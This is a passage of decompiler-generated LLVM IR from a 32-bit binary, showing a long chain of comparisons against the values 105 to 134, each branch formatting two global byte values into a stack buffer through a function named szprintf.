dec_label_pc_804b032:                             ; preds = %dec_label_pc_804b02c
  %v0_804b032 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b032 = zext i8 %v0_804b032 to i32
  store i32 %v1_804b032, i32* @edx, align 4
  %v0_804b03e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b03e = zext i8 %v0_804b03e to i32
  %v2_804b04d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b04d, i32* @ebx, align 4
  %v5_804b054 = call i32 @szprintf(i32 %v2_804b04d, i32 ptrtoint ([13 x i8]* @global_var_8058441.142 to i32), i32 %v1_804b03e, i32 %v1_804b032)
  br label %dec_label_pc_804b05c

dec_label_pc_804b05c:                             ; preds = %dec_label_pc_804b02c, %dec_label_pc_804b032
  %v12_804b05c = icmp eq i32 %v11_8049ca7, 105
  %v1_804b060 = icmp eq i1 %v12_804b05c, false
  br i1 %v1_804b060, label %dec_label_pc_804b08c, label %dec_label_pc_804b062

dec_label_pc_804b062:                             ; preds = %dec_label_pc_804b05c
  %v0_804b062 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b062 = zext i8 %v0_804b062 to i32
  store i32 %v1_804b062, i32* @edx, align 4
  %v0_804b06e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b06e = zext i8 %v0_804b06e to i32
  %v2_804b07d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b07d, i32* @ebx, align 4
  %v5_804b084 = call i32 @szprintf(i32 %v2_804b07d, i32 ptrtoint ([13 x i8]* @global_var_805844e.143 to i32), i32 %v1_804b06e, i32 %v1_804b062)
  br label %dec_label_pc_804b08c

dec_label_pc_804b08c:                             ; preds = %dec_label_pc_804b05c, %dec_label_pc_804b062
  %v12_804b08c = icmp eq i32 %v11_8049ca7, 106
  %v1_804b090 = icmp eq i1 %v12_804b08c, false
  br i1 %v1_804b090, label %dec_label_pc_804b0bc, label %dec_label_pc_804b092

dec_label_pc_804b092:                             ; preds = %dec_label_pc_804b08c
  %v0_804b092 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b092 = zext i8 %v0_804b092 to i32
  store i32 %v1_804b092, i32* @edx, align 4
  %v0_804b09e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b09e = zext i8 %v0_804b09e to i32
  %v2_804b0ad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0ad, i32* @ebx, align 4
  %v5_804b0b4 = call i32 @szprintf(i32 %v2_804b0ad, i32 ptrtoint ([12 x i8]* @global_var_805845b.144 to i32), i32 %v1_804b09e, i32 %v1_804b092)
  br label %dec_label_pc_804b0bc

dec_label_pc_804b0bc:                             ; preds = %dec_label_pc_804b08c, %dec_label_pc_804b092
  %v12_804b0bc = icmp eq i32 %v11_8049ca7, 107
  %v1_804b0c0 = icmp eq i1 %v12_804b0bc, false
  br i1 %v1_804b0c0, label %dec_label_pc_804b0ec, label %dec_label_pc_804b0c2

dec_label_pc_804b0c2:                             ; preds = %dec_label_pc_804b0bc
  %v0_804b0c2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b0c2 = zext i8 %v0_804b0c2 to i32
  store i32 %v1_804b0c2, i32* @edx, align 4
  %v0_804b0ce = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b0ce = zext i8 %v0_804b0ce to i32
  %v2_804b0dd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0dd, i32* @ebx, align 4
  %v5_804b0e4 = call i32 @szprintf(i32 %v2_804b0dd, i32 ptrtoint ([13 x i8]* @global_var_8058467.145 to i32), i32 %v1_804b0ce, i32 %v1_804b0c2)
  br label %dec_label_pc_804b0ec

dec_label_pc_804b0ec:                             ; preds = %dec_label_pc_804b0bc, %dec_label_pc_804b0c2
  %v12_804b0ec = icmp eq i32 %v11_8049ca7, 108
  %v1_804b0f0 = icmp eq i1 %v12_804b0ec, false
  br i1 %v1_804b0f0, label %dec_label_pc_804b11c, label %dec_label_pc_804b0f2

dec_label_pc_804b0f2:                             ; preds = %dec_label_pc_804b0ec
  %v0_804b0f2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b0f2 = zext i8 %v0_804b0f2 to i32
  store i32 %v1_804b0f2, i32* @edx, align 4
  %v0_804b0fe = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b0fe = zext i8 %v0_804b0fe to i32
  %v2_804b10d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b10d, i32* @ebx, align 4
  %v5_804b114 = call i32 @szprintf(i32 %v2_804b10d, i32 ptrtoint ([14 x i8]* @global_var_8058474.146 to i32), i32 %v1_804b0fe, i32 %v1_804b0f2)
  br label %dec_label_pc_804b11c

dec_label_pc_804b11c:                             ; preds = %dec_label_pc_804b0ec, %dec_label_pc_804b0f2
  %v12_804b11c = icmp eq i32 %v11_8049ca7, 109
  %v1_804b120 = icmp eq i1 %v12_804b11c, false
  br i1 %v1_804b120, label %dec_label_pc_804b14c, label %dec_label_pc_804b122

dec_label_pc_804b122:                             ; preds = %dec_label_pc_804b11c
  %v0_804b122 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b122 = zext i8 %v0_804b122 to i32
  store i32 %v1_804b122, i32* @edx, align 4
  %v0_804b12e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b12e = zext i8 %v0_804b12e to i32
  %v2_804b13d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b13d, i32* @ebx, align 4
  %v5_804b144 = call i32 @szprintf(i32 %v2_804b13d, i32 ptrtoint ([14 x i8]* @global_var_8058482.147 to i32), i32 %v1_804b12e, i32 %v1_804b122)
  br label %dec_label_pc_804b14c

dec_label_pc_804b14c:                             ; preds = %dec_label_pc_804b11c, %dec_label_pc_804b122
  %v12_804b14c = icmp eq i32 %v11_8049ca7, 110
  %v1_804b150 = icmp eq i1 %v12_804b14c, false
  br i1 %v1_804b150, label %dec_label_pc_804b17c, label %dec_label_pc_804b152

dec_label_pc_804b152:                             ; preds = %dec_label_pc_804b14c
  %v0_804b152 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b152 = zext i8 %v0_804b152 to i32
  store i32 %v1_804b152, i32* @edx, align 4
  %v0_804b15e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b15e = zext i8 %v0_804b15e to i32
  %v2_804b16d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b16d, i32* @ebx, align 4
  %v5_804b174 = call i32 @szprintf(i32 %v2_804b16d, i32 ptrtoint ([13 x i8]* @global_var_8058490.148 to i32), i32 %v1_804b15e, i32 %v1_804b152)
  br label %dec_label_pc_804b17c

dec_label_pc_804b17c:                             ; preds = %dec_label_pc_804b14c, %dec_label_pc_804b152
  %v12_804b17c = icmp eq i32 %v11_8049ca7, 111
  %v1_804b180 = icmp eq i1 %v12_804b17c, false
  br i1 %v1_804b180, label %dec_label_pc_804b1ac, label %dec_label_pc_804b182

dec_label_pc_804b182:                             ; preds = %dec_label_pc_804b17c
  %v0_804b182 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b182 = zext i8 %v0_804b182 to i32
  store i32 %v1_804b182, i32* @edx, align 4
  %v0_804b18e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b18e = zext i8 %v0_804b18e to i32
  %v2_804b19d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b19d, i32* @ebx, align 4
  %v5_804b1a4 = call i32 @szprintf(i32 %v2_804b19d, i32 ptrtoint ([14 x i8]* @global_var_805849d.149 to i32), i32 %v1_804b18e, i32 %v1_804b182)
  br label %dec_label_pc_804b1ac

dec_label_pc_804b1ac:                             ; preds = %dec_label_pc_804b17c, %dec_label_pc_804b182
  %v9_804b1ac = icmp eq i32 %v11_8049ca7, 112
  %v1_804b1b0 = icmp eq i1 %v9_804b1ac, false
  br i1 %v1_804b1b0, label %dec_label_pc_804b1dc, label %dec_label_pc_804b1b2

dec_label_pc_804b1b2:                             ; preds = %dec_label_pc_804b1ac
  %v0_804b1b2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b1b2 = zext i8 %v0_804b1b2 to i32
  store i32 %v1_804b1b2, i32* @edx, align 4
  %v0_804b1be = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b1be = zext i8 %v0_804b1be to i32
  %v2_804b1cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1cd, i32* @ebx, align 4
  %v5_804b1d4 = call i32 @szprintf(i32 %v2_804b1cd, i32 ptrtoint ([14 x i8]* @global_var_80584ab.150 to i32), i32 %v1_804b1be, i32 %v1_804b1b2)
  br label %dec_label_pc_804b1dc

dec_label_pc_804b1dc:                             ; preds = %dec_label_pc_804b1ac, %dec_label_pc_804b1b2
  %v12_804b1dc = icmp eq i32 %v11_8049ca7, 113
  %v1_804b1e0 = icmp eq i1 %v12_804b1dc, false
  br i1 %v1_804b1e0, label %dec_label_pc_804b20c, label %dec_label_pc_804b1e2

dec_label_pc_804b1e2:                             ; preds = %dec_label_pc_804b1dc
  %v0_804b1e2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b1e2 = zext i8 %v0_804b1e2 to i32
  store i32 %v1_804b1e2, i32* @edx, align 4
  %v0_804b1ee = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b1ee = zext i8 %v0_804b1ee to i32
  %v2_804b1fd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1fd, i32* @ebx, align 4
  %v5_804b204 = call i32 @szprintf(i32 %v2_804b1fd, i32 ptrtoint ([13 x i8]* @global_var_80584b9.151 to i32), i32 %v1_804b1ee, i32 %v1_804b1e2)
  br label %dec_label_pc_804b20c

dec_label_pc_804b20c:                             ; preds = %dec_label_pc_804b1dc, %dec_label_pc_804b1e2
  %v12_804b20c = icmp eq i32 %v11_8049ca7, 114
  %v1_804b210 = icmp eq i1 %v12_804b20c, false
  br i1 %v1_804b210, label %dec_label_pc_804b23c, label %dec_label_pc_804b212

dec_label_pc_804b212:                             ; preds = %dec_label_pc_804b20c
  %v0_804b212 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b212 = zext i8 %v0_804b212 to i32
  store i32 %v1_804b212, i32* @edx, align 4
  %v0_804b21e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b21e = zext i8 %v0_804b21e to i32
  %v2_804b22d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b22d, i32* @ebx, align 4
  %v5_804b234 = call i32 @szprintf(i32 %v2_804b22d, i32 ptrtoint ([14 x i8]* @global_var_80584c6.152 to i32), i32 %v1_804b21e, i32 %v1_804b212)
  br label %dec_label_pc_804b23c

dec_label_pc_804b23c:                             ; preds = %dec_label_pc_804b20c, %dec_label_pc_804b212
  %v12_804b23c = icmp eq i32 %v11_8049ca7, 115
  %v1_804b240 = icmp eq i1 %v12_804b23c, false
  br i1 %v1_804b240, label %dec_label_pc_804b26c, label %dec_label_pc_804b242

dec_label_pc_804b242:                             ; preds = %dec_label_pc_804b23c
  %v0_804b242 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b242 = zext i8 %v0_804b242 to i32
  store i32 %v1_804b242, i32* @edx, align 4
  %v0_804b24e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b24e = zext i8 %v0_804b24e to i32
  %v2_804b25d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b25d, i32* @ebx, align 4
  %v5_804b264 = call i32 @szprintf(i32 %v2_804b25d, i32 ptrtoint ([13 x i8]* @global_var_80584d4.153 to i32), i32 %v1_804b24e, i32 %v1_804b242)
  br label %dec_label_pc_804b26c

dec_label_pc_804b26c:                             ; preds = %dec_label_pc_804b23c, %dec_label_pc_804b242
  %v12_804b26c = icmp eq i32 %v11_8049ca7, 116
  %v1_804b270 = icmp eq i1 %v12_804b26c, false
  br i1 %v1_804b270, label %dec_label_pc_804b29c, label %dec_label_pc_804b272

dec_label_pc_804b272:                             ; preds = %dec_label_pc_804b26c
  %v0_804b272 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b272 = zext i8 %v0_804b272 to i32
  store i32 %v1_804b272, i32* @edx, align 4
  %v0_804b27e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b27e = zext i8 %v0_804b27e to i32
  %v2_804b28d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b28d, i32* @ebx, align 4
  %v5_804b294 = call i32 @szprintf(i32 %v2_804b28d, i32 ptrtoint ([13 x i8]* @global_var_80584e1.154 to i32), i32 %v1_804b27e, i32 %v1_804b272)
  br label %dec_label_pc_804b29c

dec_label_pc_804b29c:                             ; preds = %dec_label_pc_804b26c, %dec_label_pc_804b272
  %v12_804b29c = icmp eq i32 %v11_8049ca7, 117
  %v1_804b2a0 = icmp eq i1 %v12_804b29c, false
  br i1 %v1_804b2a0, label %dec_label_pc_804b2cc, label %dec_label_pc_804b2a2

dec_label_pc_804b2a2:                             ; preds = %dec_label_pc_804b29c
  %v0_804b2a2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b2a2 = zext i8 %v0_804b2a2 to i32
  store i32 %v1_804b2a2, i32* @edx, align 4
  %v0_804b2ae = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b2ae = zext i8 %v0_804b2ae to i32
  %v2_804b2bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2bd, i32* @ebx, align 4
  %v5_804b2c4 = call i32 @szprintf(i32 %v2_804b2bd, i32 ptrtoint ([14 x i8]* @global_var_80584ee.155 to i32), i32 %v1_804b2ae, i32 %v1_804b2a2)
  br label %dec_label_pc_804b2cc

dec_label_pc_804b2cc:                             ; preds = %dec_label_pc_804b29c, %dec_label_pc_804b2a2
  %v12_804b2cc = icmp eq i32 %v11_8049ca7, 118
  %v1_804b2d0 = icmp eq i1 %v12_804b2cc, false
  br i1 %v1_804b2d0, label %dec_label_pc_804b2fc, label %dec_label_pc_804b2d2

dec_label_pc_804b2d2:                             ; preds = %dec_label_pc_804b2cc
  %v0_804b2d2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b2d2 = zext i8 %v0_804b2d2 to i32
  store i32 %v1_804b2d2, i32* @edx, align 4
  %v0_804b2de = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b2de = zext i8 %v0_804b2de to i32
  %v2_804b2ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2ed, i32* @ebx, align 4
  %v5_804b2f4 = call i32 @szprintf(i32 %v2_804b2ed, i32 ptrtoint ([14 x i8]* @global_var_80584fc.156 to i32), i32 %v1_804b2de, i32 %v1_804b2d2)
  br label %dec_label_pc_804b2fc

dec_label_pc_804b2fc:                             ; preds = %dec_label_pc_804b2cc, %dec_label_pc_804b2d2
  %v12_804b2fc = icmp eq i32 %v11_8049ca7, 119
  %v1_804b300 = icmp eq i1 %v12_804b2fc, false
  br i1 %v1_804b300, label %dec_label_pc_804b32c, label %dec_label_pc_804b302

dec_label_pc_804b302:                             ; preds = %dec_label_pc_804b2fc
  %v0_804b302 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b302 = zext i8 %v0_804b302 to i32
  store i32 %v1_804b302, i32* @edx, align 4
  %v0_804b30e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b30e = zext i8 %v0_804b30e to i32
  %v2_804b31d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b31d, i32* @ebx, align 4
  %v5_804b324 = call i32 @szprintf(i32 %v2_804b31d, i32 ptrtoint ([14 x i8]* @global_var_805850a.157 to i32), i32 %v1_804b30e, i32 %v1_804b302)
  br label %dec_label_pc_804b32c

dec_label_pc_804b32c:                             ; preds = %dec_label_pc_804b2fc, %dec_label_pc_804b302
  %v12_804b32c = icmp eq i32 %v11_8049ca7, 120
  %v1_804b330 = icmp eq i1 %v12_804b32c, false
  br i1 %v1_804b330, label %dec_label_pc_804b35c, label %dec_label_pc_804b332

dec_label_pc_804b332:                             ; preds = %dec_label_pc_804b32c
  %v0_804b332 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b332 = zext i8 %v0_804b332 to i32
  store i32 %v1_804b332, i32* @edx, align 4
  %v0_804b33e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b33e = zext i8 %v0_804b33e to i32
  %v2_804b34d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b34d, i32* @ebx, align 4
  %v5_804b354 = call i32 @szprintf(i32 %v2_804b34d, i32 ptrtoint ([14 x i8]* @global_var_8058518.158 to i32), i32 %v1_804b33e, i32 %v1_804b332)
  br label %dec_label_pc_804b35c

dec_label_pc_804b35c:                             ; preds = %dec_label_pc_804b32c, %dec_label_pc_804b332
  %v12_804b35c = icmp eq i32 %v11_8049ca7, 121
  %v1_804b360 = icmp eq i1 %v12_804b35c, false
  br i1 %v1_804b360, label %dec_label_pc_804b38c, label %dec_label_pc_804b362

dec_label_pc_804b362:                             ; preds = %dec_label_pc_804b35c
  %v0_804b362 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b362 = zext i8 %v0_804b362 to i32
  store i32 %v1_804b362, i32* @edx, align 4
  %v0_804b36e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b36e = zext i8 %v0_804b36e to i32
  %v2_804b37d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b37d, i32* @ebx, align 4
  %v5_804b384 = call i32 @szprintf(i32 %v2_804b37d, i32 ptrtoint ([14 x i8]* @global_var_8058474.146 to i32), i32 %v1_804b36e, i32 %v1_804b362)
  br label %dec_label_pc_804b38c

dec_label_pc_804b38c:                             ; preds = %dec_label_pc_804b35c, %dec_label_pc_804b362
  %v12_804b38c = icmp eq i32 %v11_8049ca7, 122
  %v1_804b390 = icmp eq i1 %v12_804b38c, false
  br i1 %v1_804b390, label %dec_label_pc_804b3bc, label %dec_label_pc_804b392

dec_label_pc_804b392:                             ; preds = %dec_label_pc_804b38c
  %v0_804b392 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b392 = zext i8 %v0_804b392 to i32
  store i32 %v1_804b392, i32* @edx, align 4
  %v0_804b39e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b39e = zext i8 %v0_804b39e to i32
  %v2_804b3ad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3ad, i32* @ebx, align 4
  %v5_804b3b4 = call i32 @szprintf(i32 %v2_804b3ad, i32 ptrtoint ([13 x i8]* @global_var_8058526.159 to i32), i32 %v1_804b39e, i32 %v1_804b392)
  br label %dec_label_pc_804b3bc

dec_label_pc_804b3bc:                             ; preds = %dec_label_pc_804b38c, %dec_label_pc_804b392
  %v12_804b3bc = icmp eq i32 %v11_8049ca7, 123
  %v1_804b3c0 = icmp eq i1 %v12_804b3bc, false
  br i1 %v1_804b3c0, label %dec_label_pc_804b3ec, label %dec_label_pc_804b3c2

dec_label_pc_804b3c2:                             ; preds = %dec_label_pc_804b3bc
  %v0_804b3c2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b3c2 = zext i8 %v0_804b3c2 to i32
  store i32 %v1_804b3c2, i32* @edx, align 4
  %v0_804b3ce = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b3ce = zext i8 %v0_804b3ce to i32
  %v2_804b3dd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b3dd, i32* @ebx, align 4
  %v5_804b3e4 = call i32 @szprintf(i32 %v2_804b3dd, i32 ptrtoint ([12 x i8]* @global_var_8058533.160 to i32), i32 %v1_804b3ce, i32 %v1_804b3c2)
  br label %dec_label_pc_804b3ec

dec_label_pc_804b3ec:                             ; preds = %dec_label_pc_804b3bc, %dec_label_pc_804b3c2
  %v12_804b3ec = icmp eq i32 %v11_8049ca7, 124
  %v1_804b3f0 = icmp eq i1 %v12_804b3ec, false
  br i1 %v1_804b3f0, label %dec_label_pc_804b41c, label %dec_label_pc_804b3f2

dec_label_pc_804b3f2:                             ; preds = %dec_label_pc_804b3ec
  %v0_804b3f2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b3f2 = zext i8 %v0_804b3f2 to i32
  store i32 %v1_804b3f2, i32* @edx, align 4
  %v0_804b3fe = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b3fe = zext i8 %v0_804b3fe to i32
  %v2_804b40d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b40d, i32* @ebx, align 4
  %v5_804b414 = call i32 @szprintf(i32 %v2_804b40d, i32 ptrtoint ([14 x i8]* @global_var_805853f.161 to i32), i32 %v1_804b3fe, i32 %v1_804b3f2)
  br label %dec_label_pc_804b41c

dec_label_pc_804b41c:                             ; preds = %dec_label_pc_804b3ec, %dec_label_pc_804b3f2
  %v12_804b41c = icmp eq i32 %v11_8049ca7, 125
  %v1_804b420 = icmp eq i1 %v12_804b41c, false
  br i1 %v1_804b420, label %dec_label_pc_804b44c, label %dec_label_pc_804b422

dec_label_pc_804b422:                             ; preds = %dec_label_pc_804b41c
  %v0_804b422 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b422 = zext i8 %v0_804b422 to i32
  store i32 %v1_804b422, i32* @edx, align 4
  %v0_804b42e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b42e = zext i8 %v0_804b42e to i32
  %v2_804b43d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b43d, i32* @ebx, align 4
  %v5_804b444 = call i32 @szprintf(i32 %v2_804b43d, i32 ptrtoint ([14 x i8]* @global_var_805854d.162 to i32), i32 %v1_804b42e, i32 %v1_804b422)
  br label %dec_label_pc_804b44c

dec_label_pc_804b44c:                             ; preds = %dec_label_pc_804b41c, %dec_label_pc_804b422
  %v12_804b44c = icmp eq i32 %v11_8049ca7, 126
  %v1_804b450 = icmp eq i1 %v12_804b44c, false
  br i1 %v1_804b450, label %dec_label_pc_804b47c, label %dec_label_pc_804b452

dec_label_pc_804b452:                             ; preds = %dec_label_pc_804b44c
  %v0_804b452 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b452 = zext i8 %v0_804b452 to i32
  store i32 %v1_804b452, i32* @edx, align 4
  %v0_804b45e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b45e = zext i8 %v0_804b45e to i32
  %v2_804b46d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b46d, i32* @ebx, align 4
  %v5_804b474 = call i32 @szprintf(i32 %v2_804b46d, i32 ptrtoint ([14 x i8]* @global_var_805853f.161 to i32), i32 %v1_804b45e, i32 %v1_804b452)
  br label %dec_label_pc_804b47c

dec_label_pc_804b47c:                             ; preds = %dec_label_pc_804b44c, %dec_label_pc_804b452
  %v12_804b47c = icmp eq i32 %v11_8049ca7, 127
  %v1_804b480 = icmp eq i1 %v12_804b47c, false
  br i1 %v1_804b480, label %dec_label_pc_804b4ac, label %dec_label_pc_804b482

dec_label_pc_804b482:                             ; preds = %dec_label_pc_804b47c
  %v0_804b482 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b482 = zext i8 %v0_804b482 to i32
  store i32 %v1_804b482, i32* @edx, align 4
  %v0_804b48e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b48e = zext i8 %v0_804b48e to i32
  %v2_804b49d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b49d, i32* @ebx, align 4
  %v5_804b4a4 = call i32 @szprintf(i32 %v2_804b49d, i32 ptrtoint ([14 x i8]* @global_var_805855b.163 to i32), i32 %v1_804b48e, i32 %v1_804b482)
  br label %dec_label_pc_804b4ac

dec_label_pc_804b4ac:                             ; preds = %dec_label_pc_804b47c, %dec_label_pc_804b482
  %v9_804b4ac = icmp eq i32 %v11_8049ca7, 128
  %v1_804b4b3 = icmp eq i1 %v9_804b4ac, false
  br i1 %v1_804b4b3, label %dec_label_pc_804b4df, label %dec_label_pc_804b4b5

dec_label_pc_804b4b5:                             ; preds = %dec_label_pc_804b4ac
  %v0_804b4b5 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b4b5 = zext i8 %v0_804b4b5 to i32
  store i32 %v1_804b4b5, i32* @edx, align 4
  %v0_804b4c1 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b4c1 = zext i8 %v0_804b4c1 to i32
  %v2_804b4d0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b4d0, i32* @ebx, align 4
  %v5_804b4d7 = call i32 @szprintf(i32 %v2_804b4d0, i32 ptrtoint ([14 x i8]* @global_var_8058569.164 to i32), i32 %v1_804b4c1, i32 %v1_804b4b5)
  br label %dec_label_pc_804b4df

dec_label_pc_804b4df:                             ; preds = %dec_label_pc_804b4ac, %dec_label_pc_804b4b5
  %v12_804b4df = icmp eq i32 %v11_8049ca7, 129
  %v1_804b4e6 = icmp eq i1 %v12_804b4df, false
  br i1 %v1_804b4e6, label %dec_label_pc_804b512, label %dec_label_pc_804b4e8

dec_label_pc_804b4e8:                             ; preds = %dec_label_pc_804b4df
  %v0_804b4e8 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b4e8 = zext i8 %v0_804b4e8 to i32
  store i32 %v1_804b4e8, i32* @edx, align 4
  %v0_804b4f4 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b4f4 = zext i8 %v0_804b4f4 to i32
  %v2_804b503 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b503, i32* @ebx, align 4
  %v5_804b50a = call i32 @szprintf(i32 %v2_804b503, i32 ptrtoint ([14 x i8]* @global_var_8058577.165 to i32), i32 %v1_804b4f4, i32 %v1_804b4e8)
  br label %dec_label_pc_804b512

dec_label_pc_804b512:                             ; preds = %dec_label_pc_804b4df, %dec_label_pc_804b4e8
  %v12_804b512 = icmp eq i32 %v11_8049ca7, 130
  %v1_804b519 = icmp eq i1 %v12_804b512, false
  br i1 %v1_804b519, label %dec_label_pc_804b545, label %dec_label_pc_804b51b

dec_label_pc_804b51b:                             ; preds = %dec_label_pc_804b512
  %v0_804b51b = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b51b = zext i8 %v0_804b51b to i32
  store i32 %v1_804b51b, i32* @edx, align 4
  %v0_804b527 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b527 = zext i8 %v0_804b527 to i32
  %v2_804b536 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b536, i32* @ebx, align 4
  %v5_804b53d = call i32 @szprintf(i32 %v2_804b536, i32 ptrtoint ([14 x i8]* @global_var_8058585.166 to i32), i32 %v1_804b527, i32 %v1_804b51b)
  br label %dec_label_pc_804b545

dec_label_pc_804b545:                             ; preds = %dec_label_pc_804b512, %dec_label_pc_804b51b
  %v12_804b545 = icmp eq i32 %v11_8049ca7, 131
  %v1_804b54c = icmp eq i1 %v12_804b545, false
  br i1 %v1_804b54c, label %dec_label_pc_804b578, label %dec_label_pc_804b54e

dec_label_pc_804b54e:                             ; preds = %dec_label_pc_804b545
  %v0_804b54e = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b54e = zext i8 %v0_804b54e to i32
  store i32 %v1_804b54e, i32* @edx, align 4
  %v0_804b55a = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b55a = zext i8 %v0_804b55a to i32
  %v2_804b569 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b569, i32* @ebx, align 4
  %v5_804b570 = call i32 @szprintf(i32 %v2_804b569, i32 ptrtoint ([14 x i8]* @global_var_8058593.167 to i32), i32 %v1_804b55a, i32 %v1_804b54e)
  br label %dec_label_pc_804b578

dec_label_pc_804b578:                             ; preds = %dec_label_pc_804b545, %dec_label_pc_804b54e
  %v12_804b578 = icmp eq i32 %v11_8049ca7, 132
  %v1_804b57f = icmp eq i1 %v12_804b578, false
  br i1 %v1_804b57f, label %dec_label_pc_804b5ab, label %dec_label_pc_804b581

dec_label_pc_804b581:                             ; preds = %dec_label_pc_804b578
  %v0_804b581 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b581 = zext i8 %v0_804b581 to i32
  store i32 %v1_804b581, i32* @edx, align 4
  %v0_804b58d = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b58d = zext i8 %v0_804b58d to i32
  %v2_804b59c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b59c, i32* @ebx, align 4
  %v5_804b5a3 = call i32 @szprintf(i32 %v2_804b59c, i32 ptrtoint ([14 x i8]* @global_var_80585a1.168 to i32), i32 %v1_804b58d, i32 %v1_804b581)
  br label %dec_label_pc_804b5ab

dec_label_pc_804b5ab:                             ; preds = %dec_label_pc_804b578, %dec_label_pc_804b581
  %v12_804b5ab = icmp eq i32 %v11_8049ca7, 133
  %v1_804b5b2 = icmp eq i1 %v12_804b5ab, false
  br i1 %v1_804b5b2, label %dec_label_pc_804b5de, label %dec_label_pc_804b5b4

dec_label_pc_804b5b4:                             ; preds = %dec_label_pc_804b5ab
  %v0_804b5b4 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804b5b4 = zext i8 %v0_804b5b4 to i32
  store i32 %v1_804b5b4, i32* @edx, align 4
  %v0_804b5c0 = load i8, i8* @global_var_805b539.40, align 1
  %v1_804b5c0 = zext i8 %v0_804b5c0 to i32
  %v2_804b5cf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b5cf, i32* @ebx, align 4
  %v5_804b5d6 = call i32 @szprintf(i32 %v2_804b5cf, i32 ptrtoint ([14 x i8]* @global_var_80585af.169 to i32), i32 %v1_804b5c0, i32 %v1_804b5b4)
  br label %dec_label_pc_804b5de

dec_label_pc_804b5de:                             ; preds = %dec_label_pc_804b5ab, %dec_label_pc_804b5b4
  %v12_804b5de = icmp eq i32 %v11_8049ca7, 134
